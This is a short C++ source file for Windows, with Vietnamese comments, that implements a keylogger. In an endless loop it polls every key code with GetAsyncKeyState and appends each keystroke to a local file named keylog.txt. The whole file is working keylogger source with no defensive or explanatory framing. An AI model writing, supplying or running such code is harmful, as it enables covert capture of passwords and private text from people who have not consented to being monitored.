#include <windows.h>
#include <iostream>
#include <fstream>

int main() {
 std::ofstream logFile("keylog.txt", std::ios::app);
 if (!logFile) {
 std::cerr << "Không thể mở file log." << std::endl;
 return 1;
 }

 while (true) {
 for (int i = 8; i <= 255; i++) {
 if (GetAsyncKeyState(i) == -32767) {
 switch (i) {
 case VK_RETURN:
 logFile << "\n";
 break;
 case VK_TAB:
 logFile << "\t";
 break;
 case VK_SPACE:
 logFile << " ";
 break;
 default:
 logFile << static_cast<char>(i);
 break;
 }
 }
 }
 Sleep(10); // Giảm tải CPU
 }

 logFile.close();
 return 0;
}
